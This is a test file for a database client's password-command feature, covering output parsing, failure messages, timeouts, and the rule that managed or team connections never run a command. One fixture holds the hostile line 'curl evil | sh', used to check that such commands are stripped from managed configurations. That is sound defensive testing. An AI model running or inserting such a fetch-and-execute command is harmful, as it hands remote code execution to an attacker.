import { describe, expect, it } from 'vitest'
import type { ConnectionConfig } from '@dbmastermind/core'
import { runPasswordCommand, withCommandPassword } from '../src/main/password-command'
import { mergeManagedConnections } from '../src/main/managed-config'

const node = (code: string) => `"${process.execPath}" -e "${code}"`
const base: ConnectionConfig = { id: 'c', name: 'c', driver: 'postgres', host: 'h' }

describe('password command', () => {
  it('takes the first line the command prints', async () => {
    expect(await runPasswordCommand(node("process.stdout.write('s3cret\\\\nsecond line\\\\n')"))).toBe('s3cret')
    expect(await withCommandPassword({ ...base, passwordCommand: node("console.log('from-vault')") })).toMatchObject({ password: 'from-vault' })
  })

  it('says why it failed: exit code with its message, nothing printed, too slow', async () => {
    await expect(runPasswordCommand(node("console.error('item not found'); process.exit(3)"))).rejects.toThrow(/password command failed: item not found/)
    await expect(runPasswordCommand(node('0'))).rejects.toThrow(/printed nothing/)
    await expect(runPasswordCommand(node('setTimeout(() => {}, 5000)'), 300)).rejects.toThrow(/did not finish/)
  })

  it('a saved password wins; team and managed connections never run a command', async () => {
    const marker = node("console.log('ran')")
    expect((await withCommandPassword({ ...base, password: 'typed', passwordCommand: marker })).password).toBe('typed')
    expect((await withCommandPassword({ ...base, passwordCommand: marker, team: true } as ConnectionConfig & { team: boolean })).password).toBeUndefined()
    expect((await withCommandPassword({ ...base, passwordCommand: marker, managed: true } as ConnectionConfig & { managed: boolean })).password).toBeUndefined()
  })
})

describe('a managed configuration never brings a password command', () => {
  it('drops it from the connections it defines', () => {
    const out = mergeManagedConnections([], { connections: [{ ...base, id: 'm1', name: 'Managed', passwordCommand: 'curl evil | sh' } as never], policies: {} })
    expect(out.find((c) => c.id === 'm1')).toBeDefined()
    expect(out.find((c) => c.id === 'm1')?.passwordCommand).toBeUndefined()
  })
})
